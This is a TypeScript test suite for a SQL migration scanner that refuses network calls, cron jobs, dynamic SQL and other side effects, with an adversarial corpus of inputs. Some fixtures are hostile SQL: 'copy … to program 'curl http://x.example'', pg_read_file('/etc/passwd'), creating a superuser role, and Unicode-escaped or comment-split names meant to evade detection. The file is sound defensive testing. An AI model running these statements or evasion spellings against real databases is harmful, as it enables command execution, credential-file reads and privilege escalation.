// The fail-closed SQL effect scanner against an ADVERSARIAL corpus: URLs and calls hidden by comments, dynamic SQL,
// helper functions, malformed URLs, side-effecting functions, indirect cron / network setup, unreadable spellings.
// Every negative case must produce a finding that the lock would refuse; every inert case must not. Synthetic refs only.
// COVERAGE THAT IS NOT CLAIMED: SQL assembled at run time from data or from chr()/convert_from() is not evaluated --
// it is refused as DYNAMIC_SQL, never understood; a host split across string pieces with no scheme is not a finding by
// itself (it is harmless until a call reaches it, and the call's name is a finding); nothing here is a substitute for
// the SHA-256 pin of the file.
import assert from 'node:assert/strict';
import test from 'node:test';

import { dynamicFunctionNames, indirectDynamicCalls, indirectNetworkCalls, networkFunctionNames, scanSql, splitStatements, normalize, type FindingCode } from './sql_scan.ts';
import { refusalsFor } from './runner.ts';
import { buildLock, sha256Hex } from './lock.ts';

const HOST = 'zzzzzzzzzzzzzzzzzzzz.supabase.co';
const codes = (sql: string, targetRef?: string): FindingCode[] => [...new Set(scanSql(sql, { targetRef }).findings.map((f) => f.code))].sort();
const blocks = (sql: string): FindingCode[] => [...new Set(scanSql(sql).findings.filter((f) => f.severity === 'block').map((f) => f.code))].sort();
const has = (sql: string, ...expected: FindingCode[]) => {
  const actual = codes(sql);
  for (const code of expected) assert.ok(actual.includes(code), `${code} not found in ${JSON.stringify(actual)} for: ${sql.slice(0, 90)}`);
};

test('comments never hide a name: the comment is whitespace, so the call is read as written', () => {
  has("select net./**/http_post(url := 'x');", 'NET_REFERENCE');
  has("select net. -- a comment\n http_post(url := 'x');", 'NET_REFERENCE');
  has("select net /* a */ . /* b */ http_post(url := 'x');", 'NET_REFERENCE');
  has("select cron/**/.schedule('a', '* * * * *', 'select 1');", 'CRON_REFERENCE');
  has('/* outer /* inner */ still a comment */ select cron.schedule(\'a\', \'* * * * *\', \'select 1\');', 'CRON_REFERENCE');
  // a comment opener inside a string is not a comment: what follows is code
  has("select '/*'; select net.http_post(url := 'x'); select '*/';", 'NET_REFERENCE');
  has("select 'it''s'; select cron.schedule('a','* * * * *','select 1');", 'CRON_REFERENCE');
  // a quote inside a comment is not a string: what follows is code
  has("-- it's a trap\nselect net.http_post(url := 'x');", 'NET_REFERENCE');
});

test('an inert mention is not a finding (comments are inert)', () => {
  assert.deepEqual(blocks(`-- see https://${HOST}/functions/v1/x and net.http_post(...) and cron.schedule(...)\nselect 1;`), []);
  assert.deepEqual(blocks(`/* net.http_post(url := 'https://${HOST}') */ select 1;`), []);
  assert.deepEqual(blocks("grant execute on function public.f(uuid) to service_role; revoke all on function public.f(uuid) from public;"), []);
  assert.deepEqual(blocks("select has_function_privilege(r.oid, f, 'EXECUTE');"), []);
  assert.deepEqual(blocks('create trigger t after update on public.x for each row execute function private.guard();'), []);
  assert.deepEqual(blocks('create table public.t (a int references public.x (id) on update cascade on delete cascade);'), []);
  assert.deepEqual(blocks("do $$ begin raise exception 'it''s fine -- not a comment'; end $$;"), []);
  assert.deepEqual(blocks('select $$ it\'s plain text with an apostrophe $$;'), []);
});

test('hosts, URLs and fragments: any Supabase host, case-insensitive, malformed or built from pieces', () => {
  has(`select '${HOST}';`, 'SUPABASE_HOST_REFERENCE', 'FOREIGN_PROJECT_HOST');
  has(`select 'HTTPS://${HOST.toUpperCase()}/FUNCTIONS/V1/X';`, 'SUPABASE_HOST_REFERENCE', 'FOREIGN_PROJECT_HOST', 'URL_LITERAL');
  has("select 'https://abc.supabase.co.evil.example/x';", 'SUPABASE_HOST_REFERENCE', 'URL_LITERAL');
  has("select 'https:/ /x.supabase.co';", 'SUPABASE_HOST_REFERENCE');
  has("select 'https://' || ref || '.supabase' || '.co/functions/v1/x';", 'URL_LITERAL', 'URL_FRAGMENT');
  has("select '/functions/v1/important-news-monitor';", 'URL_FRAGMENT');
  has("select 'http://internal.example/hook';", 'URL_LITERAL');
  // the target's own host is a Supabase host reference, never "foreign"
  assert.ok(!codes(`select 'https://${HOST}';`, 'zzzzzzzzzzzzzzzzzzzz').includes('FOREIGN_PROJECT_HOST'));
  assert.ok(codes(`select 'https://${HOST}';`, 'zzzzzzzzzzzzzzzzzzzz').includes('SUPABASE_HOST_REFERENCE'));
});

test('dynamic SQL is a finding that must be accepted statement by statement', () => {
  has("do $$ begin execute 'select ' || 'net.http_post(url := ''x'')'; end $$;", 'DYNAMIC_SQL', 'NET_REFERENCE');
  has("do $$ begin execute format('select %I.%I(url := %L)', 'net', 'http_post', 'x'); end $$;", 'DYNAMIC_SQL');
  has("select query_to_xml('select 1', true, true, '');", 'DYNAMIC_SQL');
  has("prepare p as select 1; execute p;", 'DYNAMIC_SQL');
  has("do $$ declare v text := chr(110) || chr(101) || chr(116); begin execute 'select ' || v || '.http_post()'; end $$;", 'DYNAMIC_SQL');
  const scan = scanSql("do $$ begin execute format('select 1 from %s', v); end $$;");
  assert.equal(scan.dynamic.length, 1);
  assert.match(scan.dynamic[0].text, /^execute format\('select 1 from %s', v\)$/u);
});

test('helper functions and indirect setup: the call of a network-capable function is refused, however it is spelled', () => {
  const helper = scanSql(`create function public.ping() returns void language plpgsql as $$ begin perform net.http_post(url := 'x'); end $$;`);
  const jobs = scanSql(`create function public.schedule_all() returns void language plpgsql as $$ begin perform cron.schedule('a','* * * * *','select 1'); end $$;`);
  const innocent = scanSql(`create function public.add_one(a int) returns int language sql as $$ select a + 1 $$;`);
  assert.deepEqual(helper.definedFunctions, [{ name: 'public.ping', networkCapable: true, calls: ['net.http_post'], dynamic: false }]);
  assert.deepEqual(innocent.definedFunctions, [{ name: 'public.add_one', networkCapable: false, calls: [], dynamic: false }]);
  const network = networkFunctionNames([helper, jobs, innocent]);
  for (const name of ['public.ping', 'ping', 'public.schedule_all', 'schedule_all']) assert.ok(network.has(name), name);
  assert.ok(!network.has('add_one'));
  for (const sql of [
    'select public.ping();', 'perform ping();', 'select "public"."Ping"();', 'select public . ping ();',
    'create trigger t after insert on public.x for each row execute function public.ping();',
    'select public.schedule_all();', 'do $$ begin perform public.schedule_all(); end $$;',
  ]) {
    const calls = indirectNetworkCalls(scanSql(sql), network);
    assert.ok(calls.length >= 1 && calls.every((f) => f.code === 'INDIRECT_NETWORK_CALL' && f.severity === 'block'), sql);
  }
  assert.deepEqual(indirectNetworkCalls(scanSql('select public.add_one(1);'), network), []);
  // the function that DEFINES the helper is not "calling" itself
  assert.deepEqual(indirectNetworkCalls(helper, network), []);
});

test('side-effecting statements: cron tables, extensions, vault, files, programs, servers, languages, settings, roles, platform triggers', () => {
  has("insert into cron.job (jobname, schedule, command) values ('a', '* * * * *', 'select 1');", 'CRON_REFERENCE', 'DATA_WRITE');
  has("update cron.job set command = replace(command, 'a', 'b');", 'CRON_REFERENCE');
  has('create extension if not exists pg_cron;', 'EXTENSION_CREATE', 'CRON_REFERENCE');
  has('create extension http;', 'EXTENSION_CREATE');
  has('create extension dblink;', 'EXTENSION_CREATE');
  has("select dblink_connect('host=x');", 'NET_REFERENCE');
  has("select http_get('https://x.example');", 'NET_REFERENCE', 'URL_LITERAL');
  has("select vault.create_secret('s', 'n');", 'VAULT_REFERENCE');
  has("update vault.secrets set secret = 'x';", 'VAULT_REFERENCE');
  has("copy public.t to program 'curl http://x.example';", 'FILE_OR_PROGRAM_ACCESS', 'UNKNOWN_STATEMENT');
  has("select pg_read_file('/etc/passwd');", 'FILE_OR_PROGRAM_ACCESS');
  has("select lo_import('/tmp/x');", 'FILE_OR_PROGRAM_ACCESS');
  has("create server s foreign data wrapper postgres_fdw options (host 'x');", 'FOREIGN_SERVER');
  has("create subscription sub connection 'host=x' publication p;", 'FOREIGN_SERVER');
  has("create function f() returns void language plpython3u as $$ import urllib.request $$;", 'UNTRUSTED_LANGUAGE');
  has('create function f() returns void language c as $$ x $$;', 'UNTRUSTED_LANGUAGE');
  has("alter system set shared_preload_libraries = 'x';", 'SERVER_SETTING');
  has('select pg_reload_conf();', 'SERVER_SETTING');
  has("create role evil login superuser;", 'ROLE_CHANGE');
  has('alter role authenticator set x = 1;', 'ROLE_CHANGE');
  has('set role postgres;', 'ROLE_CHANGE');
  has('create trigger t after insert on auth.users for each row execute function public.f();', 'PLATFORM_TRIGGER');
  has('create event trigger e on ddl_command_start execute function public.f();', 'EVENT_TRIGGER');
  has('vacuum full public.t;', 'UNKNOWN_STATEMENT');
  has('refresh materialized view public.m;', 'UNKNOWN_STATEMENT');
  has('call public.p();', 'UNKNOWN_STATEMENT');
  has("select 1; select 'abc", 'UNTERMINATED_LITERAL');
  has('select 1; /* never closed', 'UNTERMINATED_LITERAL');
});

test('unreadable spellings are refused, not interpreted', () => {
  has('select U&"\\0063ron"."schedule"(\'a\', \'* * * * *\', \'select 1\');', 'UNICODE_ESCAPE');
  has("select U&'\\0068ttps://x.example';", 'UNICODE_ESCAPE');
  // quoted spellings of the same name are the same name
  has('select "net"."http_post"(url := \'x\');', 'NET_REFERENCE');
  has('select "NET"."HTTP_POST"(url := \'x\');', 'NET_REFERENCE');
  has('SELECT CRON.SCHEDULE(\'a\', \'* * * * *\', \'select 1\');', 'CRON_REFERENCE');
});

test('writes are named; reviewable findings carry a fingerprint; top-level selects are reviewed', () => {
  const scan = scanSql(`insert into public.a (x) values (1); update public.b set y = 2; delete from private.c; truncate private.d;
    select private.do_something(); with x as (select 1) select * from x;`);
  assert.deepEqual(scan.writes, ['private.c', 'private.d', 'public.a', 'public.b']);
  assert.equal(scan.topLevelSelects.length, 2);
  assert.ok(scan.findings.filter((f) => f.severity === 'review').every((f) => typeof f.fingerprint === 'string' || f.code === 'TOP_LEVEL_SELECT'));
  assert.deepEqual(blocks('insert into public.a values (1);'), []);
});

test('the lexer: nested comments, escapes, dollar tags, line numbers', () => {
  assert.equal(normalize('select 1 -- x\n, 2').text.replace(/\s+/gu, ' '), 'select 1 , 2');
  assert.equal(normalize('a /* x /* y */ z */ b').text.replace(/\s+/gu, ''), 'ab');
  assert.equal(normalize('select "Net"."Http_Post"').text, 'select net.http_post');
  assert.deepEqual(splitStatements("select 'a;b'; select $$c;d$$; select 3").map((s) => s.text), ["select 'a;b'", 'select $$c;d$$', 'select 3']);
  const lines = scanSql("select 1;\n\n\nselect net.http_post(url := 'x');").findings.find((f) => f.code === 'NET_REFERENCE');
  assert.equal(lines?.line, 4);
});

test('the lock refuses what the scanner blocks and what the review did not accept', async () => {
  const dynamic = "do $$ begin execute format('select 1 from %s', v); end $$;";
  const accepted = { dynamic: [await sha256Hex("execute format('select 1 from %s', v)")], writes: [], selects: [] };
  assert.deepEqual(await refusalsFor(dynamic, accepted, [], 'zzzzzzzzzzzzzzzzzzzz'), []);
  assert.deepEqual(await refusalsFor(dynamic, undefined, [], 'zzzzzzzzzzzzzzzzzzzz'), ['DYNAMIC_SQL']);
  assert.deepEqual(await refusalsFor("do $$ begin execute format('select 2 from %s', v); end $$;", accepted, [], 'zzzzzzzzzzzzzzzzzzzz'), ['DYNAMIC_SQL'], 'another statement is not the accepted one');
  assert.deepEqual(await refusalsFor('insert into public.a values (1);', { dynamic: [], writes: ['public.a'], selects: [] }, [], 'z'.repeat(20)), []);
  assert.deepEqual(await refusalsFor('insert into public.b values (1);', { dynamic: [], writes: ['public.a'], selects: [] }, [], 'z'.repeat(20)), ['DATA_WRITE']);
  assert.deepEqual(await refusalsFor('select public.ping();', undefined, ['public.ping', 'ping'], 'z'.repeat(20)), ['INDIRECT_NETWORK_CALL', 'TOP_LEVEL_SELECT']);
  assert.deepEqual(await refusalsFor("select net.http_post(url := 'x');", undefined, [], 'z'.repeat(20)), ['NET_REFERENCE', 'TOP_LEVEL_SELECT']);
  await assert.rejects(buildLock(['a.sql'], () => "select cron.schedule('a','* * * * *','select 1');"), /cannot be locked: CRON_REFERENCE/u);
  const lock = await buildLock(['a.sql'], () => "insert into public.a values (1);\ndo $$ begin execute 'select 1'; end $$;", { 'h.sql': 'create function public.ping() returns void language plpgsql as $$ begin perform net.http_post(url := \'x\'); end $$;' });
  assert.deepEqual(lock.reviewed?.['a.sql'].writes, ['public.a']);
  assert.equal(lock.reviewed?.['a.sql'].dynamic.length, 1);
  assert.deepEqual(lock.networkFunctions, ['ping', 'public.ping']);
});

// ---- the repository itself ----------------------------------------------------------------------------------------

const root = new URL('../../../', import.meta.url);
const read = (path: string) => Deno.readTextFileSync(new URL(path, root));
const migrations = [...Deno.readDirSync(new URL('supabase/migrations/', root))].filter((e) => e.isFile && e.name.endsWith('.sql')).map((e) => e.name).sort();

test('the repository corpus: the production-targeting cron files are blocked, the chain is clean, no helper is network-capable', () => {
  const scans = new Map(migrations.map((name) => [name, scanSql(read(`supabase/migrations/${name}`))]));
  const blockedBy = (name: string) => new Set([...(scans.get(name)?.findings ?? [])].filter((f) => f.severity === 'block').map((f) => f.code));
  const cronWithHost = migrations.filter((name) => blockedBy(name).has('FOREIGN_PROJECT_HOST'));
  assert.equal(cronWithHost.length, 8, `the eight migrations that name the production host: ${cronWithHost.join(', ')}`);
  for (const name of cronWithHost) for (const code of ['CRON_REFERENCE', 'NET_REFERENCE'] as FindingCode[]) assert.ok(blockedBy(name).has(code), `${name} ${code}`);
  // the ninth cron-touching file rewrites existing job commands from Vault: no host, still cron + vault
  const caller = '20260923110440_important_news_monitor_caller_auth.sql';
  assert.ok(blockedBy(caller).has('CRON_REFERENCE') && blockedBy(caller).has('VAULT_REFERENCE') && !blockedBy(caller).has('FOREIGN_PROJECT_HOST'));
  // the chain (and the probe) have nothing blocking, and nothing in the corpus calls a network-capable helper
  const network = networkFunctionNames([...scans.values()]);
  for (const name of migrations.filter((n) => /common_account|x_unconfirmed/u.test(n))) {
    assert.deepEqual([...blockedBy(name)], [], name);
    assert.deepEqual(indirectNetworkCalls(scans.get(name)!, network), [], name);
  }
  assert.deepEqual(scanSql(read('supabase/preflight/common_account_release_probe.sql')).findings.filter((f) => f.severity === 'block'), []);
  assert.deepEqual([...network], [], 'no repository function wraps cron or the network (the eight files call them at top level)');
});

// ---- J1 V1 R3: the corpus is closed over its call graph -------------------------------------------------------------------

const corpusOf = (...sources: string[]) => sources.map((source) => scanSql(source));
const refusedCall = (corpus: ReturnType<typeof corpusOf>, sql: string) => indirectNetworkCalls(scanSql(sql), networkFunctionNames(corpus)).length > 0;

test('network capability reaches a caller through any number of helpers, in any file, however the body is spelled', () => {
  const leaf = "create function public.audit_leaf() returns void language plpgsql as $$ begin perform net.http_post('x', '{}'::jsonb); end $$;";
  const middle = 'create function public.audit_middle() returns void language plpgsql as $$ begin perform public.audit_leaf(); end $$;';
  const top = 'create function public.audit_top() returns void language sql as $$ select public.audit_middle() $$;';
  const corpus = corpusOf(leaf, middle, top);
  for (const call of ['select public.audit_leaf();', 'select public.audit_middle();', 'select public.audit_top();', 'select audit_top();']) {
    assert.ok(refusedCall(corpus, call), call);
  }
  assert.ok(!refusedCall(corpus, 'select public.unrelated();'));
  // the order of the corpus does not matter
  assert.ok(refusedCall(corpusOf(top, middle, leaf), 'select public.audit_top();'));
  // a body in single quotes, a procedure, an SQL-standard body
  assert.ok(refusedCall(corpusOf("create function public.q() returns void language sql as 'select net.http_post(''x'', ''{}''::jsonb)';"), 'select public.q();'));
  assert.ok(refusedCall(corpusOf("create procedure public.p() language plpgsql as $$ begin perform cron.schedule('a', '* * * * *', 'select 1'); end $$;"), 'call public.p();'));
  assert.ok(refusedCall(corpusOf('create function public.s() returns void language sql begin atomic select net.http_post(\'x\', \'{}\'::jsonb); end;'), 'select public.s();'));
});

test('cycles, aliases and signature ambiguity are taken conservatively', () => {
  const corpus = corpusOf(
    "create function a.leaf() returns void language sql as $$ select net.http_post('x', '{}'::jsonb) $$;",
    'create function public.one() returns void language plpgsql as $$ begin perform public.two(); perform a.leaf(); end $$;',
    'create function public.two() returns void language plpgsql as $$ begin perform public.one(); end $$;',
    'alter function public.two() rename to renamed_two;',
    'create function public.over(int) returns int language sql as $$ select 1 $$;',
    "create function public.over(text) returns void language sql as $$ select net.http_post('x', '{}'::jsonb) $$;",
  );
  assert.ok(refusedCall(corpus, 'select public.two();'), 'a member of a cycle');
  assert.ok(refusedCall(corpus, 'select public.renamed_two();'), 'an alias reaches whatever the original reaches');
  assert.ok(refusedCall(corpus, 'select public.leaf();'), 'the schema does not exempt a call: the bare name is tainted');
  assert.ok(refusedCall(corpus, 'select public.over(1);'), 'one overload that reaches the network taints the name');
  assert.ok(!refusedCall(corpus, 'select public.harmless();'));
});

test('a function that runs run-time SQL taints its callers: the call needs a named acceptance, not a guess', () => {
  const corpus = corpusOf(
    "create function public.run_it(q text) returns void language plpgsql as $$ begin execute q; end $$;",
    'create function public.wrap(q text) returns void language sql as $$ select public.run_it(q) $$;',
    'create function public.plain() returns int language sql as $$ select 1 $$;',
  );
  const dynamic = dynamicFunctionNames(corpus);
  for (const name of ['public.run_it', 'run_it', 'public.wrap', 'wrap']) assert.ok(dynamic.has(name), name);
  assert.ok(!dynamic.has('plain'));
  assert.deepEqual(indirectDynamicCalls(scanSql('select public.wrap(1);'), dynamic), ['public.wrap']);
  assert.deepEqual(indirectDynamicCalls(scanSql('select public.plain();'), dynamic), []);
  // the defining file is not "calling" itself; a file that defines the wrapper but not the callee is calling the callee
  assert.deepEqual(indirectDynamicCalls(corpus[0], dynamic), []);
  assert.deepEqual(indirectDynamicCalls(corpus[1], dynamic), ['public.run_it']);
});
